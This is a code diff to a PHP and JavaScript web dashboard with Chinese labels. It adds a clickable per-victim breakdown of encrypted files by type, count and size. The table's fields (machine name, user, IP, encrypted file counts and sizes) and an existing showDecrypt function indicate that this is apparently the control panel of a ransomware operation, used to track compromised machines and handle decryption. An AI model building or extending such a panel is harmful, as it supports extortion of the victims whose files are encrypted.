@@ -126,6 +126,7 @@ $server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http'
   $ec=intval($row['encrypted_count']??0);
   $es=intval($row['encrypted_size']??0);
   $et=h($row['encrypted_types']??'');
+  $ed=h($row['encrypted_detail']??'{}');
   if($es>=1073741824)$sz_str=round($es/1073741824,2).' GB';
   elseif($es>=1048576)$sz_str=round($es/1048576,2).' MB';
   elseif($es>=1024)$sz_str=round($es/1024,2).' KB';
@@ -137,7 +138,7 @@ $server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http'
   <td><?=$offset+$i+1?></td><td><?=h($row['machine_name'])?></td>
   <td><?=h($row['computer_user'])?></td><td><span class="os-badge"><?=h($row['os'])?></span></td>
   <td><?=h($row['ip'])?></td><td><?=h($row['date'])?></td>
-  <td style="color:#f59e0b;font-weight:600"><?=$ec?> 个</td>
+  <td><a href="#" style="color:#f59e0b;font-weight:600;text-decoration:underline;cursor:pointer" onclick="event.preventDefault();showFileDetail(<?=$vid?>,'<?=$ed?>')"><?=$ec?> 个</a></td>
   <td style="color:#4dc3fa"><?=$sz_str?></td>
   <td><span style="font-size:.72rem;color:#94a3b8;word-break:break-all"><?=$et?></span></td>
   <td style="white-space:nowrap">
@@ -230,6 +231,29 @@ function showTab(t){
   document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
   event.target.closest('.nav-item').classList.add('active');
 }
+var _detOpen=null;
+function showFileDetail(vid,jsonStr){
+  if(_detOpen){_detOpen.remove();if(_detOpen.dataset.vid==vid){_detOpen=null;return;}_detOpen=null;}
+  var d;try{d=JSON.parse(jsonStr);}catch(e){d={};}
+  var keys=Object.keys(d).sort();
+  if(!keys.length){return;}
+  function fmtSz(b){if(b>=1073741824)return (b/1073741824).toFixed(2)+' GB';if(b>=1048576)return (b/1048576).toFixed(2)+' MB';if(b>=1024)return (b/1024).toFixed(2)+' KB';return b+' B';}
+  var h='<table style="width:100%;font-size:.8rem;border-collapse:collapse"><thead><tr style="color:var(--accent2)"><th style="text-align:left;padding:6px 10px">文件类型</th><th style="text-align:right;padding:6px 10px">数量</th><th style="text-align:right;padding:6px 10px">大小</th><th style="padding:6px 10px">占比</th></tr></thead><tbody>';
+  var total=0;keys.forEach(function(k){total+=d[k].count;});
+  keys.forEach(function(k){
+    var pct=total?Math.round(d[k].count/total*100):0;
+    var bar='<div style="background:var(--surface2);border-radius:4px;height:8px;width:80px;display:inline-block"><div style="background:var(--accent2);height:8px;border-radius:4px;width:'+pct+'%"></div></div>';
+    h+='<tr style="border-top:1px solid var(--border)"><td style="padding:5px 10px;color:#f59e0b;font-weight:600">'+k+'</td><td style="text-align:right;padding:5px 10px">'+d[k].count+' 个</td><td style="text-align:right;padding:5px 10px;color:#4dc3fa">'+fmtSz(d[k].size)+'</td><td style="padding:5px 10px">'+bar+' '+pct+'%</td></tr>';
+  });
+  h+='</tbody></table>';
+  var btns=document.querySelectorAll('a[onclick*="showFileDetail"]');
+  var tr=null;for(var b of btns){if(b.onclick.toString().indexOf(vid+',' )>-1){tr=b.closest('tr');break;}}
+  if(!tr)return;
+  var nr=document.createElement('tr');nr.dataset.vid=vid;
+  var td=document.createElement('td');td.colSpan=10;td.className='dec-expand';td.innerHTML=h;
+  nr.appendChild(td);tr.after(nr);_detOpen=nr;
+}
+
 var _decOpen=null;
 function showDecrypt(vid,ip,isLinux){
   var srv=location.origin;
